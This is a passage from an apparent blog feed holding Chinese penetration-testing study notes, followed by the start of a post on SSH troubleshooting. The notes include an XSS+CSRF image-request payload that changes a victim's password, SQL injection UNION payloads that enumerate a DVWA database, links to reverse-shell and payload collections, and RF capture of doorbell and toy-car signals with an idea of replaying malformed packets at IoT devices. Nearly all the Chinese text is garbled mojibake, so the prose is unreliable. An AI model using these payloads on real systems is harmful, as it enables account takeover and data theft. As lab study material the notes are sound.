src="https://i.imgur.com/POuyWXz.png"><br>å°‡URIæ‹¿å»ç¸®çŸ­ç¶²å€å°±èƒ½å¤ æ›´åŠ éš±è”½</p><h3 id="XSS-CSRF-çµ„åˆæŠ€"><a href="#XSS-CSRF-çµ„åˆæŠ€" class="headerlink" title="XSS+CSRF çµ„åˆæŠ€"></a>XSS+CSRF çµ„åˆæŠ€</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;æ›´æ”¹å¯†ç¢¼çš„URI&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>åå°„å‹:é»åˆ°é€™å€‹åœ–ç‰‡å°±æœƒè¢«æ›´æ”¹</li><li>å„²å­˜å‹:ç™»å…¥å¾Œå¸¶è‘—cookieç€è¦½åˆ°ç‰¹å®šåœ–ç‰‡å°±æœƒè¢«æ›´æ”¹</li></ul><h3 id="SQL-Injection-è„«åº«"><a href="#SQL-Injection-è„«åº«" class="headerlink" title="SQL Injection(è„«åº«)"></a>SQL Injection(è„«åº«)</h3><p>serverç«¯ä¸¦æœªç¶“ééæ¿¾ä½¿ç”¨è¼¸å…¥SQLèªæ³•é€²è¡Œè§£æä¸¦å°‡çµæœè¿”å›<br>SQLåŸºç¤ä½¿ç”¨:</p><ul><li>Select DB</li><li>Select table</li><li>Select column</li><li>Data</li></ul><p>ç™»å…¥DB</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -h IP</span><br><span class="line">show DB;</span><br><span class="line">use dvwa;</span><br><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/aK34Mju.png"><br><img src="https://i.imgur.com/pmUsGxs.png"></p><p>select<br><img src="https://i.imgur.com/2ljNhS8.png"><br><img src="https://i.imgur.com/dmWdah5.png"></p><p>Information Schema</p><ul><li>Information_schema.schemata æ‰€æœ‰db</li><li>Information_schema.tables æ‰€æœ‰table</li><li>Information_schema.columns æ‰€æœ‰çš„æ¬„ä½</li></ul><p><img src="https://i.imgur.com/Adjm06U.png"><br><img src="https://i.imgur.com/f6uOTKJ.png"></p><p>è¼¸å…¥1æœƒç”¢ç”ŸID1çš„è³‡è¨Š<br><img src="https://i.imgur.com/kpFZTul.png"><br>å› æ­¤å¯ä»¥ä½¿ç”¨selectèªæ³•è¼¸å…¥æ‰€æœ‰çš„db</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, schema_name from information_schema.schemata # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/iQecQTk.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables # </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/O5Ba3HO.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 &#x27; union select 1, table_name from information_schema.tables where table_name=&#x27;dvwa&#x27;# </span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/sLCOQpN.png"></p><p><img src="https://i.imgur.com/mRMPxDH.png"></p><p><img src="https://i.imgur.com/9QEBR9x.png"></p><hr><h2 id="å¥½ç”¨è³‡æº"><a href="#å¥½ç”¨è³‡æº" class="headerlink" title="å¥½ç”¨è³‡æº"></a>å¥½ç”¨è³‡æº</h2><ul><li>Payload All The Things<br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li><li>GTFObins: å„ç¨®Reverse Shell<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li>XSS Bypass Filter<br><a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html</a></li></ul><hr><h2 id="RF-æ»²é€æ¸¬è©¦"><a href="#RF-æ»²é€æ¸¬è©¦" class="headerlink" title="RF æ»²é€æ¸¬è©¦"></a>RF æ»²é€æ¸¬è©¦</h2><p>å®‰è£åŸºæœ¬å¥—ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnuradio </span><br><span class="line">sudo apt-get install gr-osmosdr</span><br><span class="line">sudo apt-get install rtl-sdr</span><br><span class="line">rtl_test</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Dpat9WW.png"></p><p><strong>é–‹å•Ÿosmocom_fft</strong><br>osmocom_fft<br><img src="https://i.imgur.com/Ewe4E1Y.png"></p><h3 id="é€šè¨Šæ¦‚è«–"><a href="#é€šè¨Šæ¦‚è«–" class="headerlink" title="é€šè¨Šæ¦‚è«–"></a>é€šè¨Šæ¦‚è«–</h3><p>è¨Šè™Ÿï¼š</p><ul><li>é¡æ¯”è¨Šè™Ÿ(é™¸è­¯:æ¨¡æ“¬è¨Šè™Ÿ):æ ¹æ“šéœ‡å¹…çš„æ”¹è®Šè€Œç”¢ç”Ÿçš„è¨Šè™Ÿï¼Œå¯ä»¥ç”¨ä¾†ä¹˜è¼‰è¨Šè™Ÿ<ul><li>èµ«èŒ²(Hz):æ¯ç§’éœ‡ç›ªå¹¾æ¬¡</li></ul></li><li>æ•¸ä½è¨Šè™Ÿ:è¡¨ç¤ºç‚º0or1ï¼Œä¸æ˜¯ç”¨ä¾†ä¹˜è¼‰è¨Šæ¯çš„</li></ul><p>é »ç‡:æ¯ç§’éœ‡ç›ªå¹¾æ¬¡ï¼Œæ¯ç§’å‘¨æœŸæ•¸<br>é »å¯¬:ç”¨ä¾†æè¿°é »ç‡çš„ç¯„åœï¼Œåˆç¨±ç‚ºå¸¶å¯¬</p><p>fft æ¼”ç®—æ³•:</p><ul><li>ä¸­å¿ƒé »ç‡(Center Frequency):(f max + f min)&#x2F;2</li><li>é »å¯¬(Bandwideth, channel width): |f max- f min|</li></ul><p>é »è­œåˆ†é…:<br><img src="https://i.imgur.com/YFYcJnm.png"></p><p>ISMé »æ®µ:</p><ul><li>ç„¡éœ€ä½¿ç”¨åŸ·ç…§èˆ‡å‘æ”¿åºœç¹³äº¤è²»ç”¨</li><li>2.4GHz, 868Mhz</li></ul><p>Sub -1Gé »æ®µ:</p><ul><li>å°æ–¼1GHzçš„é »æ®µè¢«ç¨±ç‚ºSub -1GHz</li></ul><p>ç™¼æ”¶ç«¯:èª¿è®Š-&gt;è¨Šæ¯Xè¼‰æ³¢&#x3D;è¨Šè™Ÿ<br>æ¥æ”¶ç«¯:è§£èª¿è®Š</p><ul><li>é¡æ¯”èª¿è®Š<ul><li>é »ç‡èª¿è®Š(FM):åˆ©ç”¨è¨Šè™Ÿé »ç‡å¯†åº¦ä¾†è¡¨ç¤º</li><li>æŒ¯å¹…èª¿è®Š(AM):åˆ©ç”¨è¨Šè™Ÿéœ‡å¹…é«˜ä½è¡¨ç¤º</li><li>ç›¸ä½èª¿è®Š(PM):åˆ©ç”¨ä¸åŒçš„ç›¸ä½(è§’åº¦)ä¾†è¡¨ç¤º</li></ul></li><li>æ•¸ä½èª¿è®Š<ul><li>æŒ¯å¹…åç§»èª¿è®Š(ASK)</li><li>é »ç‡åç§»èª¿è®Š(FSK)</li><li>ç›¸ä½åç§»èª¿è®Š(PSK)</li><li>æ­£äº¤åˆ†å¤šå·¥èª¿è®Š(OFDM) ex.WiFi</li></ul></li><li>æ¯”è¼ƒ<br>  <img src="https://i.imgur.com/dY7rAqQ.jpg"></li></ul><p>å–®å·¥:ç´”æ¥æ”¶ã€ç´”ç™¼å°„<br>åŠé›™å·¥:æ¥æ”¶ç™¼å°„åŒæ™‚é–“ä¸‹èƒ½æ“‡ä¸€ ex.ç„¡ç·šé›»<br>é›™å·¥:åŒæ™‚é–“ä¸‹èƒ½é€ç™¼å°„&amp;æ¥æ”¶ ex.æ‰‹æ©Ÿ</p><p>é›»æµ:<br>å°é«”ä¸Šçš„é›»æµ - ç™¼å°„æ©Ÿ(Tx) -&gt; air interface -&gt; æ¥æ”¶æ©Ÿ(Rx) - å°é«”ä¸Šçš„é›»æµ</p><p>Wireless IC Dongle<br><img src="https://i.imgur.com/1ZEd9lh.jpg"><br>SDR Flatforms<br><img src="https://i.imgur.com/W28jivl.jpg"></p><p>Wireless IC Dongle VS SDR Flatforms</p><ul><li>Wireless IC Dongle:æ”¶åˆ°è¨Šè™Ÿä»¥å¾Œï¼Œå°‡å·²è§£èª¿è¨Šè™Ÿå‚³è‡³é›»è…¦</li><li>SDR Flatforms:æ”¶åˆ°è¨Šè™Ÿä»¥å¾Œï¼Œå°‡æœªè§£èª¿è¨Šè™Ÿå‚³è‡³é›»è…¦</li></ul><p>å¢ç›ŠVSæè€—</p><ul><li>å¢ç›Š(Gain):è¼¸å‡ºçš„è¨Šè™Ÿ&gt;è¼¸å…¥çš„è¨Šè™Ÿ ,æ ¹æ“šè³ªé‡å®ˆæ†å®šç†ï¼Œè¨Šè™Ÿä¸æœƒç„¡ç·£ç„¡æ•…è®Šå¤§ï¼Œå› æ­¤æœƒç¶“éé›»æµåŠ å¤§è¨Šè™Ÿ</li><li>æè€—(Loss):è¼¸å…¥çš„è¨Šè™Ÿ&gt;è¼¸å‡ºçš„è¨Šè™Ÿ ,é€éç™¼ç†±é€²è¡Œèƒ½é‡å®ˆæ†çš„è½‰æ›</li></ul><p>ä½¿ç”¨åˆ†è²ç•¶ä½œæ¯”è¼ƒçš„æ¢ä»¶</p><p>æ¡æ¨£å®šç†:<br>å°‡ä¸€å€‹é¡æ¯”è¨Šè™Ÿç¶“éæ¡æ¨£è½‰æ›æˆä¸€å€‹æ•¸ä½è¨Šè™Ÿï¼Œéœ€è¦ç”¨å¹¾å€‹é»è¡¨ç¤ºä¸€å€‹æ³¢?</p><blockquote><p>&lt;fsæ¡æ¨£ç‡  fæ¡æ¨£é »ç‡ Bé »å¯¬&gt;</p></blockquote><ol><li>ä½é€šæ¡æ¨£å®šç†:æ¡æ¨£ç‡è‡³å°‘ç‚ºæ¡æ¨£é »ç‡çš„å…©å€<br> fs &#x3D; 2 x f</li><li>å¸¶é€šæ¡æ¨£å®šç†:æ¡æ¨£ç‡è‡³å°‘ç‚ºé »å¯¬çš„å…©å€<br> fs &#x3D; 2 x B</li></ol><ul><li><p>æŠ½å–(Decimation):é™ä½æ¡æ¨£ç‡</p></li><li><p>å…§æ’(Interpolation):æé«˜æ¡æ¨£ç‡</p></li><li><p>æ··ç–Šç¾è±¡(Aliasing Effect):æœƒç™¼ç”Ÿåœ¨è¨Šè™Ÿä¸­å¿ƒé »ç‡+-æ¡æ¨£ç‡çš„é »ç‡</p></li></ul><p>åŒ¹é…:</p><ul><li>å°„é »è¨Šè™Ÿ é˜»æŠ— 50 Î©(Ohmï¼‰</li><li>è¦–é »è¨Šè™Ÿ é˜»æŠ— 75 Î©(Ohm)</li><li>åŒ¹é…ä¸è‰¯:å°„é »ä¿¡è™Ÿæœƒæœ‰åå°„å•é¡Œï¼Œåš´é‡çš„è©±å¯èƒ½æœƒç‡’æ‰</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuradio-companion</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/oKM0usX.png"></p><p>åœ–ä¸­æ¯ä¸€å€‹éƒ½æ˜¯åŠŸèƒ½æ¨¡çµ„ç›¸é€£<br>NBFM Receiveç‚ºè§£èª¿è¨Šè™Ÿçš„Seceiveï¼Œæ²’æœ‰å®ƒå°±ä¸æœƒwork<br><img src="https://i.imgur.com/03kHTTz.png"></p><p>é–‹å•Ÿä¸€å€‹æ–°çš„æµç¨‹åœ–<br>File&gt;New&gt;WX GUI<br><img src="https://i.imgur.com/zvMNJRR.png"><br>å€åŸŸä»‹ç´¹<br><img src="https://i.imgur.com/o05gLr3.png"><br>RTL-SDRåƒæ•¸è¨­å®š<br><img src="https://i.imgur.com/UCRfAXd.png"><br>å¯ä»¥æ›´æ”¹è®Šæ•¸ï¼Œä½¿æ‰€æœ‰å’Œsamp_rateä¹‹è®Šæ•¸å…¨éƒ¨æ›´æ”¹<br><img src="https://i.imgur.com/GgUS5UZ.png"></p><p>å°‡rtlæ”¶åˆ°çš„æ‰€æœ‰è¨Šè™Ÿå­˜åˆ°file<br><img src="https://i.imgur.com/bKGy7Eq.png"><br>çµ¦file_sinkå„²å­˜çš„ä½å€<br><img src="https://i.imgur.com/gAJTMBu.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inspectrum &lt;file&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/Jf8QIdk.png"></p><h3 id="å…ƒä»¶"><a href="#å…ƒä»¶" class="headerlink" title="å…ƒä»¶"></a>å…ƒä»¶</h3><p>æœ‰æº:éœ€è¦é›»æºé‹ä½œ<br>ç„¡æº:ä¸é ˆé›»æºé‹ä½œ</p><ul><li><p>æ”¾å¤§å™¨:</p><ul><li>ä¸‰ç¨®å±¬æ€§:å¢ç›Šã€å™ªè²ä¿‚æ•¸ã€ç·šæ€§<ul><li>Gain:ä½¿ç”¨dBè¡¨ç¤º</li><li>å™ªè²ä¿‚æ•¸:ä½¿ç”¨dBè¡¨ç¤º</li><li>ç·šæ€§:å¤±çœŸç¨‹åº¦</li></ul></li><li>ä¸‰é¡:ä½å™ªéŸ³ã€é«˜åŠŸç‡ã€å…¶ä»–</li></ul></li><li><p>å¤©ç·š</p><ul><li>å¤©ç·š:æ¥æ”¶è¨Šè™Ÿèˆ‡ç™¼å°„è¨Šè™Ÿ<ul><li>å…¨å‘å¤©ç·š:å…¨æ¨£éƒ½æœ‰</li><li>æŒ‡å‘å¤©ç·š:åªæœ‰ä¸€å€‹è§’åº¦</li><li>å¢ç›Šå¤©ç·š:æ¨å»é›»ç£å ´ï¹‘éåŠŸç‡å¢ç›Šè€Œæ˜¯æ–¹å‘å¢ç›Š</li><li>ä¸»å‹•å¤©ç·š:å¿…å«åŠŸç‡å¢ç›Š</li></ul></li><li>é »ç‡:æ±ºå®šå¤©ç·šçš„å¤§å°</li><li>å‚³æ’­æ–¹å‘:æ±ºå®šå¤©æ€§çš„å½¢ç‹€<ul><li>å…¨å‘:å…¨æ¨£éƒ½æœ‰</li><li>æŒ‡å‘:åªæœ‰ä¸€å€‹è§’åº¦</li></ul></li><li>åŠŸç‡:æ±ºå®šå¤©ç·šçš„å¤§å°</li></ul></li><li><p>æ¿¾æ³¢å™¨</p><ul><li>å·²â€é »ç‡â€åŠƒåˆ†ä¸åŒè¨Šè™Ÿ<br>  <img src="https://i.imgur.com/A44cWOA.jpg"></li><li>é »ç‡éŸ¿æ‡‰:è¶…éä»–çš„æ†‘ç‡è¼ƒæœæœƒä¸‹é™</li><li>éæ¿¾ä½ ä¸è¦çš„é »ç‡</li></ul></li><li><p>æ··é »å™¨:</p><ul><li>æ”¹è®Šè¨Šè™Ÿé »ç‡ï¼Œä½†ä¿æŒå…¶ä»–ç‰¹æ€§ï¼Œä¹Ÿå°±æ˜¯åšèª¿è®Šçš„åŠŸèƒ½</li><li>é€šå¸¸æ··é »å™¨å¾Œé¢æœƒæ¥ä¸€å€‹æ¿¾æ³¢å™¨</li><li>æ¯”è¼ƒæ²’è¾¦æ³•æ•¸ä½åŒ–</li></ul></li><li><p>æŒ¯ç›ªå™¨:</p><ul><li>æ¯”è¼ƒæ²’è¾¦æ³•æ•¸ä½åŒ–</li></ul></li><li><p>å…ƒä»¶æ¯”è¼ƒ<br>  <img src="https://i.imgur.com/sQIJs7D.jpg"></p></li><li><p>å…ƒä»¶æºé€š</p><ul><li><p>ç™¼å°„æ©Ÿ<br>  <img src="https://i.imgur.com/DrcyGdD.jpg"></p></li><li><p>æ¥æ”¶æ©Ÿ</p></li></ul></li></ul><h3 id="é€†å‘å·¥ç¨‹"><a href="#é€†å‘å·¥ç¨‹" class="headerlink" title="é€†å‘å·¥ç¨‹"></a>é€†å‘å·¥ç¨‹</h3><p>æµç¨‹:</p><ol><li>Find the signal</li><li>Capture the signal</li><li>Analyze the signal</li></ol><h4 id="Analyze-the-signal"><a href="#Analyze-the-signal" class="headerlink" title="Analyze the signal:"></a>Analyze the signal:</h4><ul><li>å‰å°ç¢¼(Preamble):å‘Šè¨´é›™æ–¹è¦æº–å‚™é€£ç·šäº†<ul><li>å¸¸è¦‹çš„çš„:0xaaaa, 0x5555</li></ul></li><li>åŒæ­¥ç¢¼(Sync Word):æˆ‘ç¾åœ¨é–‹å§‹è¦å‚³è³‡æ–™äº†å–”!<ul><li>å ‚è¦‹çš„:0xd391</li></ul></li></ul><p><img src="https://i.imgur.com/naYlFWK.png"></p><p><img src="https://i.imgur.com/LzH7Dfk.png"></p><blockquote><p>FFT size:èª¿æ•´é »ç‡è»¸ç¸®æ”¾<br>Zoom:èª¿æ•´æ™‚é–“<br>Power Max:èª¿æ•´è¨Šè™Ÿé¡¯ç¤º<br>Power Min:èª¿æ•´èƒŒæ™¯å™ªéŸ³é¡¯ç¤º<br>èª¿æ•´Zoom &amp; FFT size<br><img src="https://i.imgur.com/COKLijI.jpg"></p></blockquote><p><img src="https://i.imgur.com/GEQlM5t.png"><br>è®“ç´…ç·šè²¼è¿‘è¨Šè™Ÿ<br><img src="https://i.imgur.com/MNNMpqH.png"></p><p>å¯ä»¥çœ‹è¦‹ä¸‹æ–¹çš„æŒ¯å¹…(ç¶ è‰²çš„ç·š)<br><img src="https://i.imgur.com/aEW6fvE.jpg"></p><h4 id="urh-è¨Šè™Ÿåˆ†æ"><a href="#urh-è¨Šè™Ÿåˆ†æ" class="headerlink" title="urh è¨Šè™Ÿåˆ†æ"></a>urh è¨Šè™Ÿåˆ†æ</h4><p><img src="https://i.imgur.com/cmzuK6s.png"><br>analysis<br><img src="https://i.imgur.com/aGQYkkS.png"></p><h3 id="åˆ†æç·´ç¿’"><a href="#åˆ†æç·´ç¿’" class="headerlink" title="åˆ†æç·´ç¿’"></a>åˆ†æç·´ç¿’</h3><h4 id="Doorballç·´ç¿’"><a href="#Doorballç·´ç¿’" class="headerlink" title="Doorballç·´ç¿’"></a>Doorballç·´ç¿’</h4><p>frequency 240~960MHz</p><p>modulation OOK(One of Key æ˜¯ASKçš„ä¸€ç¨®) or ASK</p><p>preamble size 0<br>preamble 0x55 or 0xaa</p><p>Sync size 32bits<br>Sync Word 0x80000000</p><p>Packet Structure:<br>Sync+(0x8eee8ee88eee888e888888e88)*39+0x8eee8ee88eee888e888888e8</p><p>äº†è§£å°åŒ…çµæ§‹ä»¥å¾Œï¼Œæ¥ä¸‹ä¾†å°±æ˜¯å¯ä»¥å»æ¨¡æ“¬ä¸€å€‹é¡ä¼¼çš„packet structureå›å‚³çµ¦IOTè£ç½®ï¼Œå¦‚æœåŸå…ˆçš„è¨Šè™Ÿæ²’æœ‰éæ¿¾éœ€è¦çš„å€¼ï¼Œä¹Ÿå°±æ˜¯èªªåœ¨Dataçš„éƒ¨åˆ†æ›´æ”¹é•·åº¦oræ›´æ”¹å…§å®¹ï¼ŒIOTæœƒä¸æœƒçˆ†æ‰</p><p>PWM</p><ul><li>é«˜é«˜ä½1</li><li>é«˜ä½ä½0</li><li>PWM é€¼ç¢¼å¸¸èˆ‡ASKé€²è¡Œèª¿è®Š</li><li>bit rate&#x3D; baud rate &#x2F; 3 &#x3D; symbol rate &#x2F; 3<br>Manchesteræ…¢æ¸¬è©¦</li><li>é«˜é›»å£“åˆ°ä½é›»å£“æ˜¯0</li><li>ä½é›»å£“åˆ°é«˜é›»å£“æ˜¯1</li><li>bit rate &#x3D; baud rate &#x2F; 2 &#x3D; symbol &#x2F;2</li></ul><h4 id="Unknowç·´ç¿’"><a href="#Unknowç·´ç¿’" class="headerlink" title="Unknowç·´ç¿’"></a>Unknowç·´ç¿’</h4><ul><li><p>Identify Application</p><ul><li>remote controlled car application</li></ul></li><li><p>Identify Modulation Type</p><ul><li>ASK&#x2F;OOK</li></ul></li><li><p>Identify Preamble</p><ul><li>No</li></ul></li><li><p>Identify Sync Word</p><ul><li>4*W2 or W2éƒ½è¡Œ</li></ul></li><li><p>Identify Encoding</p><ul><li>NRZ (å¸¸èˆ‡ASKåšèª¿è®Š but this case ä¾‹å¤–)</li></ul></li><li><p>Identify 4 Signal Function</p><ul><li><img src="https://i.imgur.com/cZLi4qY.png"></li><li>ä¸Š w2x4 + w1x10</li><li>ä¸‹ w2x4 + w1x40</li><li>å³ w2x4 + w1x64</li><li>å·¦ w2x4 + w1x58</li></ul></li><li><p>Identify Packet Structure<br><img src="https://i.imgur.com/3oTSfia.png"><br><img src="https://i.imgur.com/GokBAQ8.png"></p></li></ul><h2 id="apache2-server"><a href="#apache2-server" class="headerlink" title="apache2 server"></a>apache2 server</h2><p><strong>Reference</strong><br><a href="https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache">https://ubuntu.com/tutorials/install-and-configure-apache#2-installing-apache</a><br><a href="https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/">https://www.cyberciti.biz/faq/star-stop-restart-apache2-webserver/</a></p><ul><li>install<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure></li><li>start<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 start</span><br></pre></td></tr></table></figure></li><li>restart<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure></li><li>stop<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># sudo /etc/init.d/apache2 stop</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> å­¸ç¿’ç­†è¨˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ“‘ DMS_Troubleshooting ç­†è¨˜</title>
      <link href="/posts/5728fae1.html"/>
      <url>/posts/5728fae1.html</url>
      
        <content type="html"><![CDATA[<h2 id="Network-Debug"><a href="#Network-Debug" class="headerlink" title="Network Debug"></a>Network Debug</h2><ul><li>è‹¥ä½ SSHä¸åˆ°Serverï¼Œä½ æœƒæ€éº¼åš?<ul><li>å…ˆPing Serverçœ‹é€šä¸é€š</li><li>è‹¥é‚„æ˜¯éŒ¯èª¤å‰‡æ˜¯æ ¹æ“šSSHé€£ç·šå‡ºç¾çš„éŒ¯èª¤è¨Šæ¯ä¾†åšæ•…éšœæ’é™¤</li><li><strong>Unable to open connection to example.com Host does not exist</strong><ul><li>æª¢æŸ¥æ˜¯å¦å¯é€é <code>ping</code> ä¾†å»è§£æç›®æ¨™serveråŸŸå</li><li>è‹¥ä½¿ç”¨hostnameå‰‡æ”¹ç”¨ipè©¦è©¦çœ‹(äº¤æ›¿è©¦è©¦çœ‹)</li></ul></li><li><strong>Connection timed out</strong>: clientè©¦åœ–èˆ‡SSH Serverå»ºç«‹network socketï¼Œä½†serveråœ¨æ™‚é–“å…§æ²’èƒ½å›æ‡‰<ul><li>æª¢æŸ¥æ˜¯å¦æ­£åœ¨ä½¿ç”¨Port 22ï¼Œæˆ–è‡ªå®šç¾©çš„portå£ä¾†é€²è¡Œé€£æ¥<ul><li><code>$ netstat -all</code></li></ul></li><li>æª¢æŸ¥firewallè¦å‰‡æ˜¯å¦æœ‰é˜»æ“‹ä¾†è‡ªç‰¹å®šipæˆ–port 22çš„é€²å…¥æµé‡<ul><li><code>$ iptables --list</code></li><li>çœ‹æ˜¯ä¸æ˜¯æœ‰è¨­å®š<strong>Drop</strong> method</li><li>æˆ–æ˜¯port 22 æ²’æœ‰è¢«åŠ é€²allow connectionå…§</li></ul></li></ul></li><li><strong>Connection Refused</strong>: è«‹æ±‚æ­£åœ¨è·¯ç”±åˆ°hostï¼Œä½†hostæ²’èƒ½æ¥æ”¶åˆ°è«‹æ±‚<ul><li>æª¢æŸ¥æ˜¯å¦æ­£åœ¨ä½¿ç”¨Port 22ï¼Œæˆ–è‡ªå®šç¾©çš„portå£ä¾†é€²è¡Œé€£æ¥</li><li>æª¢æŸ¥firewallè¦å‰‡æ˜¯å¦æœ‰é˜»æ“‹ä¾†è‡ªç‰¹å®šipæˆ–port 22çš„é€²å…¥æµé‡<ul><li>çœ‹æ˜¯ä¸æ˜¯æœ‰è¨­å®š<strong>Drop</strong> method</li><li>æˆ–æ˜¯port 22 æ²’æœ‰è¢«åŠ é€²allow connectionå…§</li><li>æª¢æŸ¥æœå‹™ç•¶å‰æ˜¯å¦æ­£åœ¨é‹è¡Œä¸¦ç¶å®šåˆ°é æœŸportä¸Š</li></ul></li></ul></li><li>å¦‚ä½•æª¢æŸ¥é˜²ç«ç‰†?<ul><li><code>iptable -nL</code></li><li><code>ufw status</code></li></ul></li><li>æª¢æŸ¥SSHç‹€æ…‹<ul><li>èˆŠç‰ˆæœ¬çš„OSå¯ä»¥ä½¿ç”¨ <code>service</code><ul><li><code>service ssh status</code></li><li>è‹¥çµæœæœ‰æ­£ç¢ºé¡¯ç¤ºprocess idå‰‡ä»£è¡¨æ­£ç¢ºé‹è¡Œ</li><li>è‹¥æ²’æœ‰é‹è¡Œå‰‡æœƒé¡¯ç¤ºï¼Œssh stop&#x2F;waiting ä¹‹é¡çš„è¨Šæ¯</li><li>å¯é€é <code>service ssh start</code> é–‹å•Ÿæœå‹™</li></ul></li><li>æ–°ç‰ˆæœ¬çš„OSå¯ä»¥ä½¿ç”¨ <code>systemctl</code><ul><li><code>systemctl status sshd</code></li><li>è‹¥æ­£ç¢ºé‹è¡Œï¼Œå‰‡æœƒé¡¯ç¤ºactiveæˆ–running</li><li>è‹¥æ²’å†é‹è¡Œå‰‡æœƒé¡¯ç¤ºinactive</li><li>å¯é€é <code>systemctl start sshd</code>ä¾†é–‹å•Ÿæœå‹™</li></ul></li></ul></li><li>æª¢æŸ¥SSH Service Port<ul><li>æœ‰å…©ç¨®æ–¹å¼æª¢æŸ¥SSHæ˜¯è·‘åœ¨å“ªå€‹portä¸Š<ul><li>ç¬¬ä¸€å€‹æ˜¯å»æŸ¥çœ‹ ssh è¨­å®šæª”<ul><li><code>grep Port /etc/ssh/sshd_config</code></li></ul></li><li>è‹¥ä½ çŸ¥é“sshæœå‹™æ­£åœ¨é‹è¡Œï¼Œå‰‡å¯é€é <code>ss</code>æŒ‡ä»¤æŸ¥çœ‹æ˜¯å¦è·‘åœ¨é æœŸçš„portä¸Š<ul><li><code>ss -plnt</code> &#x2F;&#x2F;æ˜¯å¾kernelä¸­queryå‡ºsocketè³‡è¨Š</li><li><code>netstat -plnt</code></li></ul></li></ul></li></ul></li></ul></li><li>å°è‡´SSHé€£ç·šå¤±æ•—çš„åŸå› å¯èƒ½æœƒæœ‰å“ªäº›?<ul><li><strong>sshå…¬é‘°æ²’æœ‰è¢«injectåˆ°Serverä¸Š</strong><ul><li>æˆ‘å€‘åœ¨æœ¬åœ°ç«¯ç”¢ç”Ÿssh key pairï¼Œä¸¦å¯èƒ½é€épassphaseä¿è­·ç§é‘°</li><li>å°‡sshå…¬é‘°æ³¨å…¥åˆ°é ç«¯serverä¸Šçš„ <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong> è·¯å¾‘</li><li>è€Œæœ‰æ™‚å€™å¸¸æœƒè·³å‡º <strong>Permission denied (publickey)</strong> çš„éŒ¯èª¤è¨Šæ¯<ul><li>åŸå› ä¸€: è©²ç§é‘°æ²’æœ‰æ¬Šé™ç™»å…¥</li><li>åŸå› äºŒ: å…¬é‘°æ²’æœ‰æ­£ç¢ºè¢«æ”¾å…¥è·¯å¾‘æˆ–å…¬é‘°éºå¤±</li><li>åŸå› ä¸‰: æœ¬åœ° ssh å…¬é‘°å’Œç§é‘°æœªæ­£ç¢ºé…å°</li><li>åœ¨é€£æ¥ä¹‹å‰ï¼Œssh æœƒæª¢æŸ¥æˆ‘å€‘çš„å…¬é‘°å’Œç§é‘°æ˜¯å¦æ­£ç¢ºé…å°</li></ul></li><li>é è¨­è·¯å¾‘<ul><li><code>$ ssh-keygen</code></li><li>å…¬é‘°é è¨­æ”¾åœ¨ <code>/home/username/.ssh/id_rsa.pub</code></li><li>ç§é‘°é è¨­æ”¾åœ¨ <code>/home/username/.ssh/id_rsa</code></li></ul></li><li>è¦å¦‚ä½•å°‡å…¬é‘°æ³¨å…¥è‡³Serverè·¯å¾‘ä¸­? <ul><li><code>ssh-copy-id USER@HOST</code></li><li>é è¨­å°±æ˜¯æ”¾å…¥ <strong>~&#x2F;.ssh&#x2F;authorized_keys</strong></li></ul></li></ul></li><li><strong>é˜²ç«ç‰†å°è‡´ç„¡æ³•é€£ç·š</strong><ul><li>æª¢æŸ¥Policy</li></ul></li><li><strong>Host Key Check Fails</strong><br>  <img src="https://i.imgur.com/XSDQF9V.png"><br>  å‡ºç¾é¡ä¼¼é€™ç¨®éŒ¯èª¤è¨Šæ¯<br>  